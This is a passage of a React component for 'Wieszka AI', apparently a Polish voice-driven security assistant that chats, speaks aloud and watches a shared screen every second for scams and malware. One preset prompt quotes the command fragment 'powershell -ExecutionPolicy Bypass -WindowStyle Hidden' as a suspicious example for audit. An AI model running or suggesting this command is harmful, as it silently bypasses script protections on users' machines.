import React, { useState, useRef, useEffect, useCallback } from 'react';
import {
  Volume1,
  ChevronDown,
  Bot,
  Send,
  User,
  Sparkles,
  ShieldAlert,
  Terminal,
  KeyRound,
  Trash2,
  Copy,
  Check,
  Loader2,
  Zap,
  Mic,
  MicOff,
  Volume2,
  VolumeX,
  Download,
  Radio,
  Monitor,
  MonitorUp,
  MonitorOff,
  Eye,
  Camera,
  Upload,
  AlertTriangle,
  Bug,
  X,
  Activity,
  AudioLines,
  RefreshCw,
  Play,
  Pause,
} from 'lucide-react';
import { PlanTier } from '../types';
import { LanguageCode, getText } from '../i18n';


interface GeminiVoicePreset {
  id: string;
  name: string;
  desc: string;
  gender: 'male' | 'female' | 'young';
  pitch: number;
  rate: number;
  tags: string[];
}

const GEMINI_VOICE_PRESETS: GeminiVoicePreset[] = [
  {
    id: 'young_male',
    name: 'Kuba (Młody Męski)',
    desc: 'Czysty, młody, naturalny i przyjazny głos chłopaka bez zniekształceń',
    gender: 'young',
    pitch: 1.01,
    rate: 1.00,
    tags: ['młody', 'chłopak', 'naturalny', 'ludzki']
  },
  {
    id: 'young_female',
    name: 'Maja (Młody Żeński)',
    desc: 'Młody, pogodny, krystalicznie czysty i bardzo przyjemny głos dziewczęcy',
    gender: 'young',
    pitch: 1.03,
    rate: 1.00,
    tags: ['młody', 'żeński', 'dziewczyna', 'naturalna']
  },
  {
    id: 'natural_male',
    name: 'Marek (Dojrzały Męski)',
    desc: 'Opanowany, profesjonalny, naturalny i ciepły tembr męskiego obrońcy',
    gender: 'male',
    pitch: 0.97,
    rate: 0.98,
    tags: ['męski', 'dojrzały', 'ekspert', 'spokojny']
  },
  {
    id: 'natural_female',
    name: 'Paulina (Ciepły Kobiecy)',
    desc: 'Ciepły, naturalny, kojący i wyraźny głos analityczki bezpieczeństwa',
    gender: 'female',
    pitch: 1.00,
    rate: 0.98,
    tags: ['żeński', 'kobiecy', 'ciepły', 'naturalny']
  },
  {
    id: 'puck',
    name: 'Puck (Bystry Pomocnik)',
    desc: 'Lekki, inteligentny i energiczny ton asystenta AI',
    gender: 'young',
    pitch: 1.02,
    rate: 1.01,
    tags: ['bystry', 'młody', 'dynamiczny']
  },
  {
    id: 'aoede',
    name: 'Zofia (Melodyjny Kobiecy)',
    desc: 'Spokojny, harmonijny i serdeczny kobiecy głos doradczyni',
    gender: 'female',
    pitch: 1.01,
    rate: 0.97,
    tags: ['kobiecy', 'spokojny', 'melodyjny']
  },
];

interface ChatMessage {
  id: string;
  sender: 'user' | 'ai';
  text: string;
  timestamp: string;
  screenSnapshot?: string;
  category?: 'general' | 'threat_analysis' | 'remediation' | 'code_audit' | 'screen_vision' | 'live_sentinel';
}

interface ScreenAnalysisReport {
  threatLevel: 'BEZPIECZNY' | 'NISKI' | 'ŚREDNI' | 'KRYTYCZNY';
  summary: string;
  detailedDiagnosis: string;
  detectedThreats: string[];
  actionSteps: string[];
  wieszkaRecommendedModule: string;
}

interface AiAssistantViewProps {
  activePlan?: PlanTier;
  currentLang?: LanguageCode;
  onOpenSubscription?: () => void;
}

const cleanMarkdownFormatting = (text: string): string => {
  if (!text) return '';
  return text
    .replace(/```[\s\S]*?```/g, ' [kod skryptu pominięty dla mowy] ')
    .replace(/`([^`]+)`/g, '$1')
    .replace(/https?:\/\/\S+/g, 'link internetowy')
    .replace(/[CDEF]:\\[\w\\.-]+/gi, 'ścieżka na dysku')
    .replace(/^#{1,6}\s*/gm, '')
    .replace(/\*{1,3}([^*]+)\*{1,3}/g, '$1')
    .replace(/[_~#|>]/g, '')
    .replace(/[-•*]\s+/g, ', ')
    .replace(/\s+/g, ' ')
    .trim();
};

export const AiAssistantView: React.FC<AiAssistantViewProps> = ({
  currentLang = 'pl',
}) => {
  const PRESET_PROMPTS = [
    {
      title: getText(currentLang, 'Zbadaj mój ekran i wirusa', 'Inspect my screen & virus'),
      icon: Eye,
      description: getText(
        currentLang,
        'Włącz ekran lub załaduj scenariusz – Wieszka AI od razu powie Ci na głos co widzi.',
        'Turn on screen or load scenario – Wieszka AI speaks aloud what it sees right away.'
      ),
      prompt: getText(
        currentLang,
        'Wieszka, spójrz na mój ekran. Widzę dziwne powiadomienie lub okno. Czy to jest wirus i jak mam to usunąć?',
        'Wieszka, look at my screen. I see a strange popup or window. Is this a virus and how do I remove it?'
      ),
      requiresScreen: true,
    },
    {
      title: getText(currentLang, 'Czy ten komunikat to oszustwo?', 'Is this alert a scam?'),
      icon: ShieldAlert,
      description: getText(
        currentLang,
        'Analiza alertu technicznego (np. "Komputer zablokowany").',
        'Analyze tech alert (e.g. "Your computer is locked").'
      ),
      prompt: getText(
        currentLang,
        'Na ekranie pojawiło się okno z informacją, że system jest zablokowany i numerem infolinii. Czy to Tech Support Scam?',
        'A popup appeared on screen claiming system is locked with a helpline number. Is this Tech Support Scam?'
      ),
      requiresScreen: true,
    },
    {
      title: getText(currentLang, 'Audyt podejrzanych skryptów', 'Script & Command Audit'),
      icon: Terminal,
      description: getText(
        currentLang,
        'Wklej podejrzany kod PowerShell, BAT lub JavaScript do analizy.',
        'Paste suspicious PowerShell, BAT, or JS code for immediate AI inspection.'
      ),
      prompt: getText(
        currentLang,
        'Czy polecenie "powershell -ExecutionPolicy Bypass -WindowStyle Hidden" jest bezpieczne? Jak cyberprzestępcy używają skryptów?',
        'Is "powershell -ExecutionPolicy Bypass -WindowStyle Hidden" command safe? How do hackers use scripts?'
      ),
    },
    {
      title: getText(currentLang, 'Ochrona przed Ransomware', 'Ransomware Protection'),
      icon: KeyRound,
      description: getText(
        currentLang,
        'Kluczowe kroki zabezpieczające pliki przed zablokowaniem i zaszyfrowaniem.',
        'Critical steps to defend files against encryption viruses.'
      ),
      prompt: getText(
        currentLang,
        'Co to jest Ransomware i jakie natychmiastowe kroki powinienem podjąć, aby żaden wirus nie zaszyfrował moich zdjęć i dokumentów?',
        'What is Ransomware and what immediate steps should I take to prevent encryption of my personal files?'
      ),
    },
  ];

  // Conversation state
  const [messages, setMessages] = useState<ChatMessage[]>([
    {
      id: 'welcome',
      sender: 'ai',
      text: getText(
        currentLang,
        'Witaj! Jestem Wieszka AI. Działam w trybie głosowym na żywo. Odpowiadam do Ciebie głosem, a gdy udostępnisz mi swój ekran, będę go na bieżąco obserwować i sam powiem Ci na głos, gdy tylko zauważę wirusa, oszustwo lub dziwne okno. Możesz też mówić do mikrofonu swobodnie – nie musisz nic klikać ani pisać!',
        'Welcome! I am Wieszka AI. I operate in live voice mode. I speak out loud to you, and when you share your screen, I will continuously observe it and speak up whenever I spot a virus, scam, or strange popup. You can also talk into your microphone hands-free!'
      ),
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      category: 'general',
    },
  ]);

  const [inputMessage, setInputMessage] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [isCopiedAll, setIsCopiedAll] = useState(false);

  // Screen Sharing & Autonomous Live Watching
  const [isScreenSharing, setIsScreenSharing] = useState(false);
  const [screenStream, setScreenStream] = useState<MediaStream | null>(null);
  const [screenError, setScreenError] = useState<string | null>(null);
  const [currentSnapshot, setCurrentSnapshot] = useState<string | null>(null);
  const [showScreenPanel, setShowScreenPanel] = useState(false);

  // Autonomous Live Watcher Loop state
  const [isLiveWatching, setIsLiveWatching] = useState(true);
  const [isCheckingLiveScreen, setIsCheckingLiveScreen] = useState(false);
  const [liveWatchIntervalSec, setLiveWatchIntervalSec] = useState(1);
  const [liveCountdown, setLiveCountdown] = useState(1);
  const [liveThreatStatus, setLiveThreatStatus] = useState<'BEZPIECZNY' | 'NISKI' | 'ŚREDNI' | 'KRYTYCZNY' | 'OBSERWACJA'>('OBSERWACJA');
  const [lastLiveSpeech, setLastLiveSpeech] = useState<string>('');
  const [liveScreenSummary, setLiveScreenSummary] = useState<string>('');

  const lastObservationRef = useRef<string>('');
  const isFirstScanRef = useRef<boolean>(true);
  const liveWatcherTimerRef = useRef<any>(null);
  const countdownTimerRef = useRef<any>(null);
  const isTickInFlightRef = useRef<boolean>(false);

  // Video & Canvas Refs
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  // Text-To-Speech (audio speaking) state
  const [autoSpeak, setAutoSpeak] = useState<boolean>(true);
  const [isSpeaking, setIsSpeaking] = useState<boolean>(false);
  const [activeSpeechText, setActiveSpeechText] = useState<string>('');
  const [availableVoices, setAvailableVoices] = useState<SpeechSynthesisVoice[]>([]);
  const [selectedVoice, setSelectedVoice] = useState<SpeechSynthesisVoice | null>(null);
  const [selectedPresetId, setSelectedPresetId] = useState<string>(() => {
    try {
      const saved = localStorage.getItem('wieszka_voice_preset');
      if (saved && GEMINI_VOICE_PRESETS.some((p) => p.id === saved)) {
        return saved;
      }
    } catch (e) {}
    return 'young_male';
  });
  const [showVoicePicker, setShowVoicePicker] = useState<boolean>(false);
  const voicePickerRef = useRef<HTMLDivElement | null>(null);

  const handleSelectPreset = (presetId: string) => {
    setSelectedPresetId(presetId);
    try {
      localStorage.setItem('wieszka_voice_preset', presetId);
    } catch (e) {}
  };

  // Hands-Free Continuous Voice state - EXPLICITLY DISABLED on entry
  const [isHandsFreeVoice, setIsHandsFreeVoice] = useState<boolean>(false);
  const [isListening, setIsListening] = useState<boolean>(false);
  const [speechSupported, setSpeechSupported] = useState<boolean>(false);
  const [interimTranscript, setInterimTranscript] = useState<string>('');
  const [autoSendCountdown, setAutoSendCountdown] = useState<number | null>(null);

  const recognitionRef = useRef<any>(null);
  const silenceTimerRef = useRef<any>(null);
  const countdownIntervalRef = useRef<any>(null);
  const restartTimerRef = useRef<any>(null);
  const handsFreeActiveRef = useRef<boolean>(false);
  const isSpeakingRef = useRef<boolean>(false);
  const isLoadingRef = useRef<boolean>(false);
  const isListeningRef = useRef<boolean>(false);
  const currentUtteranceRef = useRef<SpeechSynthesisUtterance | null>(null);
  const speechKeepAliveRef = useRef<any>(null);
  const accumulatedSpeechRef = useRef<string>('');

  const messagesEndRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Keep refs synchronized
  useEffect(() => {
    handsFreeActiveRef.current = isHandsFreeVoice;
  }, [isHandsFreeVoice]);

  useEffect(() => {
    isSpeakingRef.current = isSpeaking;
  }, [isSpeaking]);

  useEffect(() => {
    isLoadingRef.current = isLoading;
  }, [isLoading]);

  useEffect(() => {
    isListeningRef.current = isListening;
  }, [isListening]);

  // Resolve natural, neural, human-sounding voice specifically for each preset
  const resolveVoiceForPreset = useCallback(
    (presetId: string, voices: SpeechSynthesisVoice[], manualVoiceUri?: string | null) => {
      if (!voices || voices.length === 0) return null;

      if (manualVoiceUri) {
        const found = voices.find((v) => v.voiceURI === manualVoiceUri);
        if (found) return found;
      }

      const targetLangPrefix = currentLang === 'pl' ? 'pl' : (currentLang || 'en');
      const matchedLangVoices = voices.filter((v) => v.lang.toLowerCase().startsWith(targetLangPrefix.toLowerCase()));
      const activeList = matchedLangVoices.length > 0 ? matchedLangVoices : voices;
      const preset = GEMINI_VOICE_PRESETS.find((p) => p.id === presetId) || GEMINI_VOICE_PRESETS[0];

      // Voice quality score: Natural/Neural/Google/Apple/Online voices rank highest
      const getVoiceScore = (voice: SpeechSynthesisVoice): number => {
        const n = voice.name.toLowerCase();
        let score = 0;
        if (n.includes('natural') || n.includes('online (natural)')) score += 100;
        if (n.includes('neural') || n.includes('neural2')) score += 90;
        if (n.includes('google')) score += 80;
        if (n.includes('enhanced') || n.includes('premium')) score += 75;
        if (n.includes('wavenet')) score += 70;
        if (n.includes('siri') || n.includes('apple')) score += 60;
        if (n.includes('microsoft')) score += 50;
        if (n.includes('desktop') || n.includes('espeak')) score -= 50;
        return score;
      };

      const sortedByQuality = [...activeList].sort((a, b) => getVoiceScore(b) - getVoiceScore(a));

      const isFemale = preset.gender === 'female' || preset.id.includes('female');

      if (isFemale) {
        const femaleVoice =
          sortedByQuality.find((v) => {
            const n = v.name.toLowerCase();
            return (
              n.includes('paulina') ||
              n.includes('zofia') ||
              n.includes('maja') ||
              n.includes('julia') ||
              n.includes('ewa') ||
              n.includes('agnieszka') ||
              n.includes('zosia') ||
              n.includes('female') ||
              n.includes('woman') ||
              n.includes('jenny') ||
              n.includes('aria') ||
              n.includes('samantha')
            );
          }) ||
          sortedByQuality.find((v) => {
            const n = v.name.toLowerCase();
            return !n.includes('marek') && !n.includes('kuba') && !n.includes('adam') && !n.includes('jan') && !n.includes('male');
          }) ||
          sortedByQuality[0];
        return femaleVoice;
      }

      // Male or Young male preset
      const maleVoice =
        sortedByQuality.find((v) => {
          const n = v.name.toLowerCase();
          return (
            n.includes('kuba') ||
            n.includes('marek') ||
            n.includes('adam') ||
            n.includes('jan') ||
            n.includes('krzysztof') ||
            n.includes('jacek') ||
            n.includes('male') ||
            n.includes('man') ||
            n.includes('guy') ||
            n.includes('daniel') ||
            n.includes('paul')
          );
        }) ||
        sortedByQuality.find((v) => {
          const n = v.name.toLowerCase();
          return !n.includes('paulina') && !n.includes('zofia') && !n.includes('ewa') && !n.includes('female') && !n.includes('zosia');
        }) ||
        sortedByQuality[0];

      return maleVoice || sortedByQuality[0] || null;
    },
    [currentLang]
  );

  // Load voices for natural Polish speech synthesis
  useEffect(() => {
    if (!('speechSynthesis' in window)) return;

    const loadVoices = () => {
      const voices = window.speechSynthesis.getVoices();
      setAvailableVoices(voices);
      const initialVoice = resolveVoiceForPreset(selectedPresetId, voices, null);
      setSelectedVoice(initialVoice);
    };

    loadVoices();
    window.speechSynthesis.onvoiceschanged = loadVoices;
  }, [resolveVoiceForPreset, selectedPresetId]);

  // Keyboard shortcut listener: Pressing Escape or typing immediately interrupts AI speech
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && isSpeakingRef.current) {
        stopSpeaking();
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // Close voice dropdown on outside click
  useEffect(() => {
    const handleClickOutside = (e: MouseEvent) => {
      if (voicePickerRef.current && !voicePickerRef.current.contains(e.target as Node)) {
        setShowVoicePicker(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  // Text-To-Speech Function with Character Preset Modulation and Robust Lifecycle
  const speakText = useCallback(
    (textToSpeak: string, overridePresetId?: string) => {
      if (!('speechSynthesis' in window) || !autoSpeak) return;

      const cleanText = cleanMarkdownFormatting(textToSpeak).replace(/[\n\r]+/g, '. ').trim();
      if (!cleanText) return;

      // Cancel previous speech, resume synthesizer state, and clear keep-alive
      window.speechSynthesis.cancel();
      window.speechSynthesis.resume();
      if (speechKeepAliveRef.current) {
        clearInterval(speechKeepAliveRef.current);
        speechKeepAliveRef.current = null;
      }

      try {
        const utterance = new SpeechSynthesisUtterance(cleanText);
        utterance.lang = currentLang === 'pl' ? 'pl-PL' : 'en-US';

        const activePresetId = overridePresetId || selectedPresetId;
        const activePreset = GEMINI_VOICE_PRESETS.find((p) => p.id === activePresetId) || GEMINI_VOICE_PRESETS[0];

        const resolvedVoice = resolveVoiceForPreset(activePresetId, availableVoices, selectedVoice?.voiceURI);
        if (resolvedVoice) {
          utterance.voice = resolvedVoice;
        }

        utterance.rate = activePreset.rate;
        utterance.pitch = activePreset.pitch;

        utterance.onstart = () => {
          setIsSpeaking(true);
          isSpeakingRef.current = true;
          setActiveSpeechText(cleanText);

          // Keep-alive timer to prevent Chrome from pausing speech synthesis during longer explanations
          if (speechKeepAliveRef.current) clearInterval(speechKeepAliveRef.current);
          speechKeepAliveRef.current = setInterval(() => {
            if (window.speechSynthesis.speaking) {
              window.speechSynthesis.pause();
              window.speechSynthesis.resume();
            } else {
              clearInterval(speechKeepAliveRef.current);
              speechKeepAliveRef.current = null;
            }
          }, 8000);
        };

        utterance.onend = () => {
          setIsSpeaking(false);
          isSpeakingRef.current = false;
          setActiveSpeechText('');
          currentUtteranceRef.current = null;
          if (speechKeepAliveRef.current) {
            clearInterval(speechKeepAliveRef.current);
            speechKeepAliveRef.current = null;
          }
        };

        utterance.onerror = (err) => {
          if (err.error !== 'interrupted' && err.error !== 'canceled') {
            console.warn('SpeechSynthesis error:', err);
          }
          setIsSpeaking(false);
          isSpeakingRef.current = false;
          setActiveSpeechText('');
          currentUtteranceRef.current = null;
          if (speechKeepAliveRef.current) {
            clearInterval(speechKeepAliveRef.current);
            speechKeepAliveRef.current = null;
          }
        };

        currentUtteranceRef.current = utterance;
        setIsSpeaking(true);
        isSpeakingRef.current = true;
        setActiveSpeechText(cleanText);

        window.speechSynthesis.speak(utterance);
      } catch (e) {
        console.warn('Speech synthesis exception:', e);
        setIsSpeaking(false);
        isSpeakingRef.current = false;
        setActiveSpeechText('');
        currentUtteranceRef.current = null;
        if (speechKeepAliveRef.current) {
          clearInterval(speechKeepAliveRef.current);
          speechKeepAliveRef.current = null;
        }
      }
    },
    [autoSpeak, currentLang, selectedVoice, selectedPresetId, availableVoices, resolveVoiceForPreset]
  );

  const stopSpeaking = useCallback(() => {
    if ('speechSynthesis' in window) {
      window.speechSynthesis.cancel();
      setIsSpeaking(false);
      isSpeakingRef.current = false;
      setActiveSpeechText('');
      currentUtteranceRef.current = null;
      if (speechKeepAliveRef.current) {
        clearInterval(speechKeepAliveRef.current);
        speechKeepAliveRef.current = null;
      }
    }
  }, []);

  // Capture current video frame as lightweight base64 JPEG for ultra-low latency vision
  const captureFrame = useCallback((): string | null => {
    if (videoRef.current && videoRef.current.videoWidth > 0) {
      const video = videoRef.current;
      const canvas = canvasRef.current || document.createElement('canvas');
      // Ultra-fast compact frame resolution: 640px width is perfect for text/UI recognition while keeping payload under ~20KB
      const targetWidth = Math.min(video.videoWidth, 640);
      const targetHeight = Math.round((targetWidth / video.videoWidth) * video.videoHeight);
      canvas.width = targetWidth;
      canvas.height = targetHeight;
      const ctx = canvas.getContext('2d', { alpha: false });
      if (ctx) {
        ctx.imageSmoothingQuality = 'medium';
        ctx.drawImage(video, 0, 0, targetWidth, targetHeight);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.45);
        setCurrentSnapshot(dataUrl);
        return dataUrl;
      }
    }
    return currentSnapshot;
  }, [currentSnapshot]);

  // Main chat submission handler
  const handleSendMessage = useCallback(
    async (textToSend?: string, attachedImage?: string) => {
      const query = textToSend || inputMessage;
      if (!query.trim() || isLoadingRef.current) return;

      if (silenceTimerRef.current) {
        clearTimeout(silenceTimerRef.current);
        silenceTimerRef.current = null;
      }
      if (countdownIntervalRef.current) {
        clearInterval(countdownIntervalRef.current);
        countdownIntervalRef.current = null;
      }
      setAutoSendCountdown(null);
      accumulatedSpeechRef.current = '';
      setInterimTranscript('');

      // Interrupt any current speech
      stopSpeaking();

      // Automatically capture current screen frame if screen sharing or snapshot exists
      let screenImageToSend: string | undefined = attachedImage;
      if (!screenImageToSend && (isScreenSharing || currentSnapshot)) {
        screenImageToSend = captureFrame() || currentSnapshot || undefined;
      }

      const userMsg: ChatMessage = {
        id: Date.now().toString(),
        sender: 'user',
        text: query.trim(),
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        screenSnapshot: screenImageToSend,
        category: screenImageToSend ? 'screen_vision' : 'general',
      };

      setMessages((prev) => [...prev, userMsg]);
      if (!textToSend) setInputMessage('');
      setInterimTranscript('');
      setIsLoading(true);

      try {
        const historyPayload = messages.slice(-6).map((m) => ({
          sender: m.sender,
          text: m.text,
        }));

        const response = await fetch('/api/ai/chat', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: query.trim(),
            history: historyPayload,
            screenImage: screenImageToSend,
            voiceMode: true,
          }),
        });

        if (!response.ok) {
          throw new Error('Błąd połączenia z serwerem Wieszka AI.');
        }

        const data = await response.json();
        const rawAiReply = data.reply || 'Nie udało się uzyskać odpowiedzi od Wieszka AI.';
        const aiReplyText = cleanMarkdownFormatting(rawAiReply);

        const aiMsgId = (Date.now() + 1).toString();
        const aiMsg: ChatMessage = {
          id: aiMsgId,
          sender: 'ai',
          text: aiReplyText,
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
          category: screenImageToSend ? 'screen_vision' : 'general',
        };

        setMessages((prev) => [...prev, aiMsg]);

        // Speak response out loud
        speakText(aiReplyText);
      } catch (err: any) {
        console.error('Chat error:', err);
        const errorText = 'Przepraszam, wystąpił problem z połączeniem z silnikiem Wieszka AI. Upewnij się, że połączenie z chmurą Wieszka AI jest aktywne.';
        const errorMsg: ChatMessage = {
          id: (Date.now() + 1).toString(),
          sender: 'ai',
          text: errorText,
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        };
        setMessages((prev) => [...prev, errorMsg]);
        speakText(errorText);
      } finally {
        setIsLoading(false);
      }
    },
    [inputMessage, isScreenSharing, currentSnapshot, captureFrame, messages, speakText, stopSpeaking]
  );

  // Autonomous Live Screen Watcher Tick: Wieszka AI monitors screen continuously (1s ultra-fast interval)
  const performLiveScreenTick = useCallback(
    async (overrideImage?: string, forcedImmediate = false) => {
      if (isLoadingRef.current || isTickInFlightRef.current) {
        return;
      }

      const frame = overrideImage || captureFrame() || currentSnapshot;
      if (!frame) return;

      isTickInFlightRef.current = true;
      setIsCheckingLiveScreen(true);

      try {
        const response = await fetch('/api/ai/live-screen-watch', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            screenImage: frame,
            lastObservation: lastObservationRef.current,
            isFirstScan: isFirstScanRef.current || forcedImmediate,
            forceSpeak: Boolean(forcedImmediate),
          }),
        });

        if (!response.ok) return;

        const data = await response.json();
        if (data.success && data.result) {
          const res = data.result;
          setLiveThreatStatus(res.threatLevel || 'BEZPIECZNY');
          if (res.screenSummary) {
            setLiveScreenSummary(res.screenSummary);
          }

          // Cicha obserwacja: Mówimy TYLKO w razie wykrycia realnego zagrożenia lub wymuszenia przyciskiem!
          if (res.shouldSpeak && res.spokenMessage?.trim()) {
            lastObservationRef.current = res.spokenMessage;
            isFirstScanRef.current = false;
            setLastLiveSpeech(res.spokenMessage);

            const liveAiMsg: ChatMessage = {
              id: Date.now().toString(),
              sender: 'ai',
              text: cleanMarkdownFormatting(res.spokenMessage),
              timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
              screenSnapshot: frame,
              category: 'live_sentinel',
            };

            setMessages((prev) => [...prev, liveAiMsg]);

            // SPEAK OUT LOUD AUTONOMOUSLY: The AI directly alerts the user about the threat
            speakText(res.spokenMessage);
          } else if (forcedImmediate) {
            // User explicitly requested instant check and everything is safe
            const safeMsg = 'Przeanalizowałem Twój bieżący ekran. Wszystkie otwarte okna są bezpieczne i nie wykryto żadnego złośliwego oprogramowania.';
            setLastLiveSpeech(safeMsg);
            speakText(safeMsg);
          }
        }
      } catch (err) {
        console.warn('Live screen watcher tick error:', err);
      } finally {
        isTickInFlightRef.current = false;
        setIsCheckingLiveScreen(false);
      }
    },
    [captureFrame, currentSnapshot, speakText]
  );

  // Live Screen Watcher Interval Management (1s default for real-time responsiveness)
  useEffect(() => {
    if (!isLiveWatching || (!isScreenSharing && !currentSnapshot)) {
      if (liveWatcherTimerRef.current) clearInterval(liveWatcherTimerRef.current);
      if (countdownTimerRef.current) clearInterval(countdownTimerRef.current);
      return;
    }

    setLiveCountdown(liveWatchIntervalSec);

    // Countdown ticker for visual user feedback
    countdownTimerRef.current = setInterval(() => {
      setLiveCountdown((prev) => {
        if (prev <= 1) {
          return liveWatchIntervalSec;
        }
        return prev - 1;
      });
    }, 1000);

    // Main inspection interval
    liveWatcherTimerRef.current = setInterval(() => {
      performLiveScreenTick();
    }, liveWatchIntervalSec * 1000);

    return () => {
      if (liveWatcherTimerRef.current) clearInterval(liveWatcherTimerRef.current);
      if (countdownTimerRef.current) clearInterval(countdownTimerRef.current);
    };
  }, [isLiveWatching, isScreenSharing, currentSnapshot, liveWatchIntervalSec, performLiveScreenTick]);

  // Continuous Hands-Free Voice Listening Loop
  useEffect(() => {
    const SpeechRecognition =
      (window as any).SpeechRecognition || (window as any).webkitSpeechRecognition;

    if (!SpeechRecognition) {
      setSpeechSupported(false);
      return;
    }

    setSpeechSupported(true);

    try {
      const recognition = new SpeechRecognition();
      recognition.continuous = true;
      recognition.interimResults = true;
      recognition.lang = currentLang === 'pl' ? 'pl-PL' : 'en-US';

      recognition.onsoundstart = () => {
        // Instant interruption when user starts speaking
        if (isSpeakingRef.current) {
          stopSpeaking();
        }
      };

      recognition.onspeechstart = () => {
        if (isSpeakingRef.current) {
          stopSpeaking();
        }
      };

      recognition.onresult = (event: any) => {
        let interimStr = '';
        let finalStr = '';

        for (let i = event.resultIndex; i < event.results.length; i++) {
          const item = event.results[i];
          if (item.isFinal) {
            finalStr += item[0].transcript;
          } else {
            interimStr += item[0].transcript;
          }
        }

        const spokenContent = (finalStr + ' ' + interimStr).trim();
        if (spokenContent) {
          // If AI was speaking, user's voice immediately cuts it off
          if (isSpeakingRef.current) {
            stopSpeaking();
          }

          setInterimTranscript(spokenContent);
          setInputMessage(spokenContent);
          accumulatedSpeechRef.current = spokenContent;

          // Clear previous silence & countdown timers
          if (silenceTimerRef.current) clearTimeout(silenceTimerRef.current);
          if (countdownIntervalRef.current) clearInterval(countdownIntervalRef.current);

          // 1.5s (1500ms) Auto-Send Delay as explicitly requested
          const AUTO_SEND_DELAY_MS = 1500;
          const startTime = Date.now();
          setAutoSendCountdown(1.5);

          countdownIntervalRef.current = setInterval(() => {
            const elapsed = Date.now() - startTime;
            const remaining = Math.max(0, (AUTO_SEND_DELAY_MS - elapsed) / 1000);
            setAutoSendCountdown(parseFloat(remaining.toFixed(1)));
            if (remaining <= 0) {
              clearInterval(countdownIntervalRef.current);
              countdownIntervalRef.current = null;
            }
          }, 100);

          silenceTimerRef.current = setTimeout(() => {
            if (countdownIntervalRef.current) {
              clearInterval(countdownIntervalRef.current);
              countdownIntervalRef.current = null;
            }
            setAutoSendCountdown(null);

            const contentToSend = accumulatedSpeechRef.current || spokenContent;
            if (contentToSend.trim().length >= 2 && !isLoadingRef.current) {
              handleSendMessage(contentToSend);
              setInterimTranscript('');
              setInputMessage('');
              accumulatedSpeechRef.current = '';
            }
          }, AUTO_SEND_DELAY_MS);
        }
      };

      recognition.onerror = (err: any) => {
        if (err.error !== 'no-speech' && err.error !== 'aborted') {
          console.warn('SpeechRecognition status:', err.error);
        }
      };

      recognition.onend = () => {
        setIsListening(false);
        if (restartTimerRef.current) {
          clearTimeout(restartTimerRef.current);
          restartTimerRef.current = null;
        }
        // ALWAYS keep hands-free microphone active when user enabled it
        if (handsFreeActiveRef.current) {
          restartTimerRef.current = setTimeout(() => {
            try {
              if (handsFreeActiveRef.current) {
                recognition.start();
                setIsListening(true);
              }
            } catch (e) {
              // Already running or blocked
            }
          }, 250);
        }
      };

      recognitionRef.current = recognition;
    } catch (e) {
      console.warn('SpeechRecognition setup error:', e);
    }

    return () => {
      if (silenceTimerRef.current) clearTimeout(silenceTimerRef.current);
      if (restartTimerRef.current) clearTimeout(restartTimerRef.current);
      if (recognitionRef.current) {
        try {
          recognitionRef.current.stop();
        } catch (e) {}
      }
    };
  }, [currentLang, handleSendMessage, stopSpeaking]);

  // Handle Video Stream attachment
  useEffect(() => {
    if (videoRef.current && screenStream) {
      videoRef.current.srcObject = screenStream;
      videoRef.current.play().catch((err) => console.warn('Video play error:', err));
    }
  }, [screenStream, showScreenPanel]);

  // Clean up media stream on unmount
  useEffect(() => {
    return () => {
      if (screenStream) {
        screenStream.getTracks().forEach((track) => track.stop());
      }
    };
  }, [screenStream]);

  // Start real browser screen share
  const startScreenShare = async () => {
    setScreenError(null);
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
        throw new Error(
          'Twoja przeglądarka nie obsługuje funkcji getDisplayMedia lub dostęp jest ograniczony.'
        );
      }

      const stream = await navigator.mediaDevices.getDisplayMedia({
        video: {
          displaySurface: 'monitor',
          cursor: 'always',
        } as any,
        audio: false,
      });

      setScreenStream(stream);
      setIsScreenSharing(true);
      setShowScreenPanel(true);
      setIsLiveWatching(true);
      isFirstScanRef.current = true;

      const track = stream.getVideoTracks()[0];
      if (track) {
        track.onended = () => {
          stopScreenShare();
        };
      }

      // Initial autonomous capture and speech trigger after brief delay
      setTimeout(() => {
        const frame = captureFrame();
        if (frame) {
          performLiveScreenTick(frame, true);
        }
      }, 1000);
    } catch (err: any) {
      console.warn('Screen share error:', err);
      if (err.name === 'NotAllowedError') {
        setScreenError('Udostępnianie ekranu zostało anulowane przez użytkownika.');
      } else {
        setScreenError(
          'Nie udało się uruchomić bezpośredniego przechwytywania ekranu (np. ograniczenia iframe lub przeglądarki). Możesz przetestować gotowe scenariusze infekcji poniżej lub wgrać zrzut ekranu z pliku.'
        );
      }
      setShowScreenPanel(true);
    }
  };

  const stopScreenShare = () => {
    if (screenStream) {
      screenStream.getTracks().forEach((track) => track.stop());
      setScreenStream(null);
    }
    setIsScreenSharing(false);
  };

  // Load a realistic mock infected screen for demonstration / testing
  // AND IMMEDIATELY TRIGGER AUTONOMOUS LIVE OBSERVATION & VOICE!
  const loadMockInfectedScreen = (type: 'tech_scam' | 'ransomware' | 'powershell_cmd') => {
    const canvas = canvasRef.current || document.createElement('canvas');
    canvas.width = 1280;
    canvas.height = 720;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    if (type === 'tech_scam') {
      ctx.fillStyle = '#004A99';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = '#FFFFFF';
